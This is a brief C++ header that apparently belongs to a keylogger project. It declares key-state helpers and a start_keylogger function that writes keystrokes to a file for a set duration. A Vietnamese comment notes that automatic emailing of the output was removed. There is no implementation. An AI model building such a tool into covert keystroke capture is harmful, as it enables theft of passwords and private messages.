#pragma once

bool isShiftPressed();
bool isCapsLockOn();
std::string getCharFromKey(int key);

// Chỉ giữ lại start_keylogger - không tự động gửi email
void start_keylogger(const std::string& outputFilePath, int durationInSeconds);